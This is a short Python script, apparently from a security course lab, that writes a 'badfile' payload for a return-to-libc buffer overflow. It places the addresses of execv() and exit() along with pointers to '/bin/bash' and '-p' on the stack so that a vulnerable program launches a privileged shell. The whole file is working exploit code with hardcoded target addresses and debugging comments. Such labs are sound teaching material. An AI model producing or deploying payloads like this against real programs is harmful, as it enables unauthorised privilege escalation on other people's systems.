#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

Y = 64 
execv_addr = 0xf7e90420  # The address of execv() this shouldn't change. 
content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')

Z = 68 
exit_addr = 0xf7dfbec0 # The address of exit() this shouldn't change.
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

CC = 72
start_of_buf = 0xffffd41f  #1st param string /bin/bash. If you print out the env variable it may be a few bytes off.
content[CC:CC+4] = (start_of_buf).to_bytes(4,byteorder='little')

# 2nd param - address to the argv array.  0xffffcdb0 is the start of input[] in main(). 0xffffcd4c is start of input[] in bof(). 
input_start = 0xffffcd4c
argv_array = input_start + 84
OO = 76
content[OO:OO+4] = (argv_array).to_bytes(4,byteorder='little')

DD = 84
dd_addr = 0xffffd41f # /bin/bash string too
content[DD:DD+4] = (dd_addr).to_bytes(4,byteorder='little')

EE = 88
ee_addr = 0xffffd62d # -p
content[EE:EE+4] = (ee_addr).to_bytes(4,byteorder='little')

FF = 92
null_var = 0xffffcf87 
content[FF:FF+4] =(null_var).to_bytes(4,byteorder='little')
#content[FF:FF+4] =(0).to_bytes(4,byteorder='little')


content[96:100] = b'\x00'*4 #tried specifically adding NULL after the array 

with open("badfile", "wb") as f:
  f.write(content)
